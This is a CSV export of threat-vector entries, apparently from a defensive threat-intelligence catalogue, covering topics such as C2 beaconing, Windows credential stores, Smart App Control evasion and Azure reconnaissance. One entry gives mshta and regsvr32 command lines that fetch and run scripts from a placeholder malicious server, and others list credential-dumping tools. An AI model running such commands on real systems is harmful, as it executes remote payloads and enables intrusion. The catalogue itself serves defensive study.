UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
8934c19a-954b-4dce-8081-0a6acca599f6,Malicious container image deployed,Threat Vectors,clear,"Threat actors plant malicious code into container images which 
execute in target environment. This vector is used to perform 
cryptominning activities and as a persistence technique.
",1,2022-07-04,2025-10-01,,,,,"T1525, T1204.003"
08b47a3b-fe90-4c9e-97f0-aa7bae361db1,Scheduled tasks to connect to adversarial infrastructure,Threat Vectors,clear,"A scheduled task is a task that is set to run automatically at a specific
time or interval. 

In the context of connecting to adversarial infrastructure,
a scheduled task would be a task that is set up to automatically establish
a connection to C2 infrastructure to check for 'orders' at a specified time
or interval. 

This could involve running a script that usually establishes an outbound 
connection. The exact details of how the task is set up would depend on the 
specific adversarial infrastructure being used and the tools and protocols 
available for connecting to it.
",4,2022-12-13,2022-12-16,,,,"[Enterprise] HAFNIUM, HAFNIUM",T1053.005
cce22952-735a-4255-8319-e5e44aef9d85,Windows startup folder abused by malware,Threat Vectors,clear,"The Windows Startup folder is a legitimate feature in Windows that allows
users to specify programs or applications to launch automatically when the
operating system starts. In several reports and analysis different threat
actors have been known to abuse this feature to achieve persistence and
evade detection on compromised systems. 

As a first step the malware is distributed by an initial threat vector, for
example spear-phishing attack. Once the malware is on the targeted system it
creates a shortcut or executable file in the Windows Startup folder
ref [5], [6].

There are several different possible startup locations which can be used
by the threat actors to run malicious programs. 

Examples:

- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`.
- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

A recent campaign, ref [2], showed threat actors exploiting a vulnerability
in a software application  to deploy shortcut files in the startup folder,
that would point to the malicious executable.

When the user logs in or the system boots, Windows automatically executes
the programs or applications in the Startup folder. Usually the malware is
disguised as a legitimate program and runs in the background, often without 
the user's knowledge or consent.

### Techniques used by malware

- Shortcut files: Malware creates a shortcut file (.lnk) in the Startup
  folder, pointing to the malicious executable.
- Executable files: Malware places an executable file (.exe) directly in the
  Startup folder.
- Registry modifications: Some malware (Amadey) may also overwrite the 
Windows registry key, thush changing the startup folder to the ones 
containing its payload.
- Scripts - some threat actors have used the startup folder as a persistence 
mechanism to execute script files.
- Archive exploitation: WinRAR or crafted installers extract payloads into
  the Startup folder (notably CVE-2023-38831 exploited in the wild).

### Known malware families which can abuse a Windows Startup folder

- Ransomware: Some ransomware variants, like WannaCry and NotPetya, used
  the Startup folder to launch their malicious payloads.
- Trojans: Trojans, such as Emotet and TrickBot, have been known to use the
  Startup folder to maintain persistence on compromised systems.
- Adware/PUP: Adware or Potentially Unwanted Programs (PUPs), like the 
notorious Ask Toolbar, has been found to use the Startup folder to launch 
themselves.  
- LNK Loaders (e.g Gamaredon) ref [7].
",1,2025-08-21,2025-08-22,,,"{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84'], 'atomicity::implements': ['86f62c3a-6556-4a64-a9f5-a79168ad42d9']}","RomCom, Gamaredon Group, [Enterprise] Gamaredon Group",T1547.001
7b122bb4-fc13-438b-a052-4388c501ec59,C2 beaconing on specific time intervals,Threat Vectors,clear,"C2 beaconing refers to the periodic communication between a compromised
system and a Command and Control (C2) server. The packets are sent from the
infected host to the C2 server at regular intervals, known as the `beacon
interval`, which can be down to the second to avoid suspicion. For example,
a Cobalt Strike beacon might have an average sleep of several seconds with
jitter added to disrupt the pattern. The compromised system, often is
referred as a ""beacon"" sends periodic signals or ""beacons"" to the C2 for
one of the following reasons ref [1].

- Check for new commands or updates
- Report back on its status or activities
- Receive instructions or configuration changes
- C2 beaconing on specific time intervals

To avoid detection, attackers often configure the compromised system to
beacon on specific time intervals.

### Possible C2 beaconing set-up

A threat actor can set C2 server to respond in one of the following ways.

- Fixed intervals: The beacon sends signals at fixed intervals, e.g., every
  5 minutes, 1 hour, or 24 hours.
- Randomised intervals: The beacon sends signals at randomised intervals,
  e.g., between 5-15 minutes, to make it harder to detect.
- Scheduled intervals: The beacon sends signals at specific times, e.g.,
  during business hours or when the system is most active.

### Threat actor's purposes

Attackers can set a specific timing or rules in their Command and Control
servers depends on different reasons and goals.

- Evade detection: By beaconing at regular intervals, the attacker can avoid
  detection by security systems that rely on anomaly detection or behavioral
  analysis.
- Maintain stealth: By using fixed or randomized intervals, the attacker can
  make it harder for security teams to detect the beaconing activity.
- Conserve resources: By only communicating at specific intervals, the
  attacker can conserve resources, such as bandwidth and system resources,
  on the compromised system.  
",1,2025-08-22,2025-08-26,,,,,"T1205, T1029"
d0522985-6001-4e25-a5ff-2dc87bf2fee8,Windows credential access attempt,Threat Vectors,clear,"Windows credential access refers to techniques used by threat
actors to steal authentication information such as passwords,
hashes, tokens, or Kerberos tickets stored on or transmitted
by Windows systems. These credentials enable unauthorized
access to systems, networks, or sensitive data, facilitating
lateral movement, privilege escalation, or persistent control.  

Threat actors exploit Windows credential access using various tools
and Living Off The Land Binaries (LOLBins) utilities to gain
unauthorized access to sensitive information.  

Windows credentials usually are stored in two main locations.

### Credentials folder (Windows Vault)

This folder stores encrypted copies of user credentials used
by Windows services, applications, and scheduled tasks.
Example for path storing credentials in Windows

`C:\Users\<username>\AppData\Local\Microsoft\Credentials`
`C:\Users\<username>\%LocalAppData%\Microsoft\Credentials\`

where <username> is the logged-in user's account name.  

### Credential Manager

It's location is not fixed. The store of the user credentisls
in this case may vary depending on the user account and other
system settings as language and preferences.  

The Windows OS has many different places it stores or caches its 
credentials, such as:  

- Security Accounts Manager (SAM) database. 
The SAM database is a file present on all Windows systems. This file 
contains all accounts created, as well as all built-in accounts.
Passwords are stored here as hashes. (NT password hash) 
- Other Files 
Passwords can also be found in configuration files and user created files 
(usually plaintext). Certain log files may contain credential information,
such as installer logs, and can also sometimes be found in crash reports. 
- Cached Credentials 
Domain credentials are cached in the registry to allow users to log into their
system when it is not connected to the domain. The Windows system caches the last
10 logon hashes, and some store up to 25 by default. This number is configurable. 
- Local Security Authority Secret (LSA) 
LSA secrets are stored in the registry and allow services to run with user privileges.
This includes VPNs, scheduled tasks, auto-logins, backup service accounts, IIS websites, etc.
They are included in the Security/Policy/Secrets registry in encrypted form. 
- Local Security Authority Subsystem Service Process (LSASS) 
When logging into a Windows machine, credentials are stored in the LSASS process in memory. 
This is primarily used to allow the user to access other resources on the network that they
are authorized to access without having to re-authenticate. The stored formats can be
plaintext (reversable encryption), NT and LM hash, and Kerberos tickets. 
- Credential Store Manager 
The manager is available with Windows 7 and higher. It is basically a digital vault that 
allows users to store user credentials “safely.” All the credentials are stored in a 
specific folder on the Windows system. Windows and Web credentials can be stored here. 
- AD Domain database (NTDS.DIT)
This database stores all credentials for users and computers located on every
AD Domain controller server in an active directory domain environment. (%SystemRoot%\NTDS folder) 

### Known used tools for Windows credential dumping and access ref [1]

- Mimikatz: A popular tool used to extract plaintext passwords,
hash, PIN codes, and Kerberos tickets from memory. It can also
perform pass-the-hash, pass-the-ticket, and build Golden Tickets.
- CrackMapExec: An open-source hacking tool for Windows Active
Directory environments.
- Empire: a post-exploitation and adversary emulation framework
- BloodHound: An open-source tool that uses graph theory to reveal
the hidden and often unintended relationships within an Active
Directory environment. 
- Hashcat: A password cracking tool that can crack Windows hashes,
including NTLM and LM hashes.
- John the Ripper: A password cracking tool that can crack Windows
passwords using dictionary attacks, brute-force attacks, or rainbow
table attacks.
- PsExec: A tool that allows executing commands on remote systems,
which can be used to extract credentials.
- Built-in Windows OS utilities as reg.exe for registry access,
WMI Windows utility, cmd, tasklist and others. 

### Possible used LOLBins utilities ref [2]:

- Windows Credential Editor (WCE): A utility that allows modifying
Windows credentials, including adding new credentials or modifying
existing ones.
- cmdkey: A built-in Windows utility that allows managing cached
credentials, including adding, deleting, or listing credentials.
- runas: A built-in Windows utility that allows running commands
under a different user context, which can be used to exploit
credentials.
- PowerShell: A powerful scripting language that can be used to
exploit credentials, including using cmdlets like Get-Credential
or Invoke-Command.
- tasklist: A built-in Windows utility that can be used to list
running processes, including those running under different user
contexts, which can help identify potential credential
exploitation opportunities.
- wmic: A built-in Windows utility that provides a command-line
interface to the Windows Management Instrumentation (WMI) repository,
which can be used to exploit credentials.
",1,2025-02-03,2025-02-11,,,"{'sequence::preceeds': ['35c76d6c-2ac7-486e-b0b7-b56f6b110bec', '03cc9593-e7cf-484b-ae9c-684bf6f7199f', '3b1026c6-7d04-4b91-ba6f-abc68e993616', 'd5039f2c-9fcc-4ba3-ad6a-da8c891ba745']}","APT29, [Enterprise] APT29, [Mobile] APT28, APT28, [Mobile] APT28, [ICS] Lazarus Group, Lazarus Group, [ICS] Lazarus Group","T1003.002, T1110.003, T1557, T1550.002, T1110"
ce7194f8-2398-4e79-b964-162ca5ee175b,Secrets stored in repository,Threat Vectors,clear,"Secrets are digital authentication credentials such as encryption keys,
passwords, private keys, AWS secrets, Oauth tokens, JWT tokens, Slack
tokens, API secrets and others. Many of the organizations still keep
these secrets in plain-text hardcoded into source code, configuration
files or some of the configuration tools. (ref [1])    

Many developers use GitHub for personal projects and can happen to
leak by mistake corporate credentials even without rrealizing this.
Threat actors usually look first at the public repositories on GitHub,
and then at the ones owned by its employees. They use the collected data
to access company resources and databases and to compromise further the
infrastructure. They may use the collected data also for extortion
purposes threaten to publish it in public. (ref [2])  

This may pose a risk because the secrets could be stolen or leaked
without the knowledge of the internal staff. For example, they may be
accidentally or inadvertently committed in to the source code repository.
Once the secret is saved in history it is accessible and exposed to any 
malicious actor with read access.  

As a good practice make sure secrets are never stored in source code
and Software Control Management (SCM) or other configuration tools.
(ref [3])

Examples for secretes stored in repositories are:  

- Application Programming Interface (API) keys
- Database credentials
- Identity and Access Management (IAM) permissions
- Secure Shell (SSH) keys
- Certificates    

There is a growing need for organizations to centralize the storage,
provisioning, auditing, rotation and management of secrets to control
access to secrets and prevent them from leaking and compromising the
organization. Often, services share the same secrets, which makes
identifying the source of compromise or leak challenging. (ref [1])  
",1,2023-04-13,2024-04-12,,,,"[Mobile] LAPSUS$, LAPSUS",T1213.003
e1741a76-3df1-430a-8dda-5c6bc9c3e1dd,Paragon Spyware,Threat Vectors,clear,"Paragon Spyware, also known as Graphite, is a sophisticated surveillance tool developed 
by Paragon Solutions, an Israeli company founded in 2019. This spyware is designed to infiltrate 
encrypted messaging apps such as WhatsApp, Signal, Facebook Messenger, and Gmail, allowing 
law enforcement and intelligence agencies to intercept private communications.    

## Key Features    

- **Zero-Click Exploit**: Graphite uses a ""zero-click"" method, meaning it can infect 
a device without any action from the target.
- **WhatsApp Vulnerability**: The spyware exploits a vulnerability in WhatsApp, 
using a malicious PDF file to gain access to the device.
- **Data Extraction**: Once installed, Graphite can extract stored files, photos, 
and monitor communications across various platforms.
- **Cloud Upload**: The extracted data is uploaded to a cloud server, leaving no 
traces on the infected device.
- **Sandbox Escape**: The spyware can escape the Android sandbox to compromise other 
apps on the targeted devices.    

## Recent Developments    

In January 2025, WhatsApp patched a zero-day vulnerability that was being exploited 
by Paragon Spyware. The company notified approximately 90 Android users from over 
20 countries who were targeted, including journalists and activists.
",1,2025-03-26,2025-03-26,,,,,"T1430, T1636.003, T1189, T1513, T1633, T1068"
dcf021a5-2846-40b4-8189-2695a7a32b9a,Possible Smart App Control Evasion Attempt,Threat Vectors,clear,"Smart App Control is a cloud-powered security feature in Windows 11 designed to 
block malicious, untrusted, and potentially unwanted applications from running. 
It uses a combination of reputation checks and digital signatures to determine whether 
an application is safe to execute. If an app is not recognized or is considered 
risky, SAC blocks its execution.

## Main Evasion Techniques

**1. Registry Manipulation**
Registry manipulation is a common method in broader Windows attack vectors for disabling 
or bypassing security features. Adversaries may attempt to:
- **Disable or modify SAC-related registry keys** to weaken or turn off the feature.
- **Tamper with security policy settings** stored in the registry to lower protection levels.
  
**2. Code-Signing and Certificate Abuse**
One of the most prevalent methods to bypass SAC is to sign malware with a legitimate 
code-signing certificate. Attackers increasingly use Extended Validation (EV) certificates, 
which require identity verification, by impersonating legitimate businesses to obtain 
them. This allows malware to appear trustworthy and slip past SAC’s checks.

**3. Reputation-Based Evasion**
- **Reputation Hijacking:** Attackers repurpose trusted applications (like script interpreters) 
to load and execute malicious code without triggering alerts.
- **Reputation Seeding:** Attackers use seemingly innocuous binaries to trigger 
malicious behavior after a certain time or event.
- **Reputation Tampering:** Attackers alter parts of legitimate binaries to inject 
shellcode without losing their good reputation.

**4. LNK Stomping**
Attackers exploit the way Windows handles shortcut (LNK) files. By crafting LNK 
files with non-standard target paths or structures, they can remove the ""mark-of-the-web"" 
(MotW) tag before security checks are performed, allowing malicious payloads to 
bypass SAC.

**5. Social Engineering**
Attackers trick users into overriding security warnings or disabling SAC by posing 
as legitimate sources or using persuasive tactics.

**6. Living-Off-The-Land Binaries (LOLBins)**
Attackers abuse signed Microsoft-supplied binaries (e.g., `mshta.exe`, 
`rundll32.exe`, `regsvr32.exe`) to proxy execution of malicious scripts 
and payloads, which Smart App Control might not block if the binary is 
considered trusted.
",1,2025-06-12,2025-06-24,,,,,"T1112, T1195, T1204"
d5892ae6-d022-4ac8-858c-c2756067cdac,Malicious Code Execution with Windows Utilities,Threat Vectors,clear,"### 1. Msxsl.exe

**Description**: A command-line XSLT processor that can transform XML data using 
XSL style sheets. Attackers can craft malicious XSL files that execute arbitrary 
code when processed.

Example:

```
msxsl.exe input.xml malicious.xsl
```

### 2. Mshta.exe
**Description**: Executes Microsoft HTML Applications (HTA files). Threat actors use it 
to run malicious scripts hosted locally or remotely.

Example:

```
mshta.exe ""http://malicious-server/payload.hta""
```

### 3. Regsvr32.exe
**Description**: Registers and unregisters OLE controls like DLLs and ActiveX controls. 
Threat actors can use it to execute code via scripts.

Example:

```
regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
```",1,2024-11-04,2024-11-04,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[ICS] FIN7, FIN7, [Enterprise] Cobalt Group, Cobalt, [Mobile] APT28, APT28","T1218.005, T1218.010"
53f4e2f0-7d11-4629-bb26-905993a589db,Azure - Storage account reconnaissance,Threat Vectors,clear,"Azure storage account reconnaissance refers to the initial phase of cyberattacks 
where adversaries gather information about target storage accounts to identify vulnerabilities 
and plan subsequent attacks. This threat vector is critical as it enables attackers 
to map out potential entry points and weak configurations in cloud storage environments.

### Techniques and Methods  
**Storage account discovery**:  
- Attackers use methods like DNS reconnaissance (e.g., searching `*.blob.core.windows.net` subdomains) 
and brute-forcing account names to identify active Azure storage accounts.  
- Publicly available tools such as **Microburst** and **BlobHunter** automate the 
enumeration of storage accounts and containers.  

**Public container/blob enumeration**:  
- Adversaries exploit misconfigured public access settings (e.g., containers set to ""container"" or ""blob"" access levels) 
to list and access sensitive data without authentication.  
- Techniques include analyzing DNS records, web page source code, and cloud metadata 
for storage account URLs.  

### Attack Implications  
Successful reconnaissance can lead to:  
1. **Data exposure**: Identification of publicly accessible containers with sensitive data.  
2. **Lateral movement**: Discovery of storage accounts linked to higher-privileged 
resources (e.g., Azure Functions) for token theft and privilege escalation.  
3. **Malware distribution**: Mapping storage accounts used for hosting malicious 
content via features like static websites.  
",3,2025-05-28,2025-09-08,,,"{'support::enabled': ['41f57a57-1ed6-407e-bb70-a0f6ab52af10', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1078.004"
